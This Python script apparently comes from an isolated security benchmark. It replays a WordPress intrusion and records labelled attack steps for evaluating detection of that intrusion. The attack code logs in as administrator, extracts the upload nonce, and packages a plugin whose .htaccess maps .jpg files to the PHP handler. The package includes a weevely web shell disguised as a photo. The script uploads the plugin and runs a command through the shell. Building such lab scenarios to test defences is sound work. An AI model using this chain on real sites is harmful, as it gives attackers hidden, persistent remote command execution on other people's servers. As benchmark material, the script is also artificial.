"""Record a WordPress .htaccess and image-extension persistence scenario."""

from __future__ import annotations

import argparse
import json
import os
import socket
import subprocess
import sys
import tempfile
import time
import zipfile
from datetime import UTC, datetime
from pathlib import Path

import requests

sys.path.insert(0, "/opt/v2")

EDGE = "http://edge"
ATTACKER_IP = "192.0.2.131"
ADMIN_USER = os.environ["BENCH_ADMIN_USER"]
ADMIN_PASSWORD = os.environ["BENCH_ADMIN_PASSWORD"]
PLUGIN_DIR = "m8v2-persistence"
PLUGIN_PATH = f"{PLUGIN_DIR}/m8v2-persistence.php"
IMAGE_NAME = "m8v2-photo.jpg"
IMAGE_PATH = f"{PLUGIN_DIR}/{IMAGE_NAME}"
IMAGE_URL = f"{EDGE}/wp-content/plugins/{IMAGE_PATH}"
AGENT_PASSWORD = os.environ["BENCH_AGENT_PASSWORD"]


def timestamp() -> str:
    return datetime.now(UTC).isoformat(timespec="microseconds")


def isolate() -> None:
    from background import target_url

    try:
        target_url("/", "outside-lab")
    except ValueError:
        print("non_allowlisted_service_refused=PASS")
    else:
        raise SystemExit("non_allowlisted_service_refused=FAIL")
    try:
        with socket.create_connection(("1.1.1.1", 443), timeout=2):
            raise SystemExit("external_address_unreachable=FAIL")
    except OSError:
        print("external_address_unreachable=PASS")


def perform_attack() -> None:
    ready = Path("/replay/background-halfway")
    continuation = Path("/replay/background-continue")
    for _ in range(2400):
        if ready.exists():
            break
        time.sleep(0.05)
    else:
        raise TimeoutError("background replay did not reach its seeded attack point")

    records: dict[str, object] = {
        "scenario_id": "s10",
        "description": (
            "An administrator session installs a plugin archive containing a handler "
            "configuration and an agent disguised with an image extension. The agent "
            "is used once to confirm that the configuration executes it."
        ),
        "attacker_ips": [ATTACKER_IP],
        "root_cause_step": "persistence_upload",
        "steps": [],
        "files": [
            {"path": f"/wp-content/plugins/{PLUGIN_DIR}/.htaccess", "role": "persistence_config"},
            {"path": f"/wp-content/plugins/{PLUGIN_PATH}", "role": "malicious_plugin"},
            {"path": f"/wp-content/plugins/{IMAGE_PATH}", "role": "webshell_agent"},
            {
                "path": "/wp-content/uploads/wp-file-manager-pro/fm_backup/index.php",
                "role": "side_effect",
                "expected_in_report": False,
            },
        ],
        "analysis": {
            "access_logs": ["access.log.gz"],
            "error_logs": ["app-error.log"],
            "error_log_format": "apache",
            "error_log_utc_offset": "+0000",
            "manifest": "manifest.tsv",
            "baseline": "baseline.tsv",
            "trusted_proxies": [],
        },
        "split": "dev",
        "expected_rule_ids": [],
    }
    steps: list[dict[str, object]] = []
    for step_id, path in (
        ("site_check", "/"),
        ("login_page_probe", "/wp-login.php"),
        ("admin_probe", "/wp-admin/"),
        ("plugin_upload_probe", "/wp-admin/plugin-install.php?tab=upload"),
    ):
        requests.get(
            f"{EDGE}{path}",
            headers={"X-Lab-Step": step_id},
            timeout=10,
            allow_redirects=False,
        )
        steps.append(
            {
                "id": step_id,
                "category": "reconnaissance",
                "mitre": ["T1595"],
                "label_method": "header",
                "expected_in_timeline": False,
            }
        )

    session = requests.Session()
    login_page = session.get(
        f"{EDGE}/wp-login.php", headers={"X-Lab-Step": "login_form"}, timeout=15
    )
    if login_page.status_code != 200:
        raise RuntimeError(f"WordPress login form returned HTTP {login_page.status_code}")
    steps.append(
        {
            "id": "login_form",
            "category": "valid_account_access",
            "mitre": ["T1078.003"],
            "label_method": "header",
        }
    )
    login = session.post(
        f"{EDGE}/wp-login.php",
        data={
            "log": ADMIN_USER,
            "pwd": ADMIN_PASSWORD,
            "wp-submit": "Log In",
            "redirect_to": f"{EDGE}/wp-admin/",
            "testcookie": "1",
        },
        headers={"X-Lab-Step": "editor_login"},
        timeout=15,
        allow_redirects=False,
    )
    if login.status_code != 302:
        raise RuntimeError(f"administrator login was not accepted (HTTP {login.status_code})")
    steps.append(
        {
            "id": "editor_login",
            "category": "valid_account_access",
            "mitre": ["T1078.003"],
            "label_method": "header",
        }
    )

    upload_page = session.get(
        f"{EDGE}/wp-admin/plugin-install.php?tab=upload",
        headers={"X-Lab-Step": "plugin_upload_form"},
        timeout=15,
    )
    if upload_page.status_code != 200:
        raise RuntimeError(f"plugin upload form returned HTTP {upload_page.status_code}")
    import re

    nonce_match = re.search(r'name="_wpnonce"\s+value="([^"]+)"', upload_page.text)
    if nonce_match is None:
        raise RuntimeError("WordPress plugin upload form did not contain its nonce")
    steps.append(
        {
            "id": "plugin_upload_form",
            "category": "valid_account_access",
            "mitre": ["T1078.003"],
            "label_method": "header",
        }
    )

    with tempfile.TemporaryDirectory(prefix="s10-persistence-") as temporary:
        package = Path(temporary) / "m8v2-persistence.zip"
        agent = Path(temporary) / IMAGE_NAME
        subprocess.run(
            ["weevely", "generate", AGENT_PASSWORD, str(agent)],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        with zipfile.ZipFile(package, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            archive.writestr(
                f"{PLUGIN_DIR}/.htaccess",
                "AddHandler application/x-httpd-php .jpg\n",
            )
            archive.writestr(
                PLUGIN_PATH,
                "<?php\n/*\nPlugin Name: M8 v2 S10 persistence package\nVersion: 1.0\n*/\n",
            )
            archive.write(agent, f"{PLUGIN_DIR}/{IMAGE_NAME}")
        upload = session.post(
            f"{EDGE}/wp-admin/update.php?action=upload-plugin",
            data={"_wpnonce": nonce_match.group(1), "install-plugin-submit": "Install Now"},
            files={"pluginzip": (package.name, package.open("rb"), "application/zip")},
            headers={"X-Lab-Step": "persistence_upload"},
            timeout=30,
            allow_redirects=False,
        )
        if upload.status_code != 200 or not any(
            phrase in upload.text for phrase in ("Plugin installed successfully", "Activate Plugin")
        ):
            raise RuntimeError(
                f"persistence archive installation returned HTTP {upload.status_code}"
            )
    steps.append(
        {
            "id": "persistence_upload",
            "category": "persistence_installation",
            "mitre": ["T1505.003"],
            "label_method": "header",
        }
    )

    started_at = timestamp()
    result = subprocess.run(
        ["weevely", IMAGE_URL, AGENT_PASSWORD, "id"],
        check=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        timeout=20,
    )
    ended_at = timestamp()
    if not result.stdout.strip():
        raise RuntimeError("the image-extension agent returned no command output")
    steps.append(
        {
            "id": "image_agent_command",
            "category": "webshell_command",
            "mitre": ["T1059.004"],
            "label_method": "attacker_ip_time_window",
            "attacker_ip": ATTACKER_IP,
            "started_at": started_at,
            "ended_at": ended_at,
            "request": f"POST /wp-content/plugins/{IMAGE_PATH} HTTP/1.1",
            "status": 200,
            "candidate_ordinal": 1,
        }
    )
    continuation.write_text("continue\n", encoding="ascii")
    records["steps"] = steps
    Path("/replay/records.json").write_text(
        json.dumps(records, ensure_ascii=False, indent=2) + "\n", encoding="utf-8"
    )
    print(json.dumps({"attack_completed": True, "steps": len(steps)}, sort_keys=True))


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("action", choices=("isolation", "attack"))
    args = parser.parse_args()
    if args.action == "isolation":
        isolate()
    else:
        perform_attack()


if __name__ == "__main__":
    main()
